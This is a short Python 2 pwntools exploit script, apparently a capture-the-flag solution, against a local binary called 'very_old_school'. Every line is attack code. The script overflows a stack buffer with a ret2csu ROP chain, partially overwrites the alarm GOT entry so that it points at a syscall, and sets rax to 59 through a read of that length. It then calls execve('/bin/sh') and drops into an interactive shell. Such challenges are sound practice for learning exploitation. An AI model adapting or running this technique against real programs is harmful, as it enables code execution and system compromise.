#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math, time
context(arch = "amd64",os = "linux", log_level = "debug")

p = process(['./very_old_school'], env={"LD_PRELOAD":"./libc-2.27.so"})
elf = ELF('./very_old_school')

gdb_command = ""
gdb.attach(p, gdb_command)
time.sleep(1)

bin_sh_str = 0x601500
main_sym = 0x400540
read_plt = elf.plt['read']
alarm_got = elf.got['alarm']
pop_rsi_r15_ret = 0x4005e1
csu_pop_regs = 0x4005da
call_gadget = 0x4005c0

payload = "a" * 0x48 + \
    p64(pop_rsi_r15_ret) + p64(alarm_got) + p64(0) + p64(read_plt) + \
    p64(pop_rsi_r15_ret) + p64(bin_sh_str) + p64(0) + p64(read_plt) + \
    p64(csu_pop_regs) + p64(0) * 2 + p64(alarm_got) + p64(bin_sh_str) + p64(0) * 2 + p64(call_gadget)

p.send(payload.ljust(0x100, '\x00'))
raw_input()
p.send(p8(0x15)) # Point
raw_input()
p.send("/bin/sh\x00".ljust(59, 'a')) # 59 is Sys_execve No.


p.interactive()
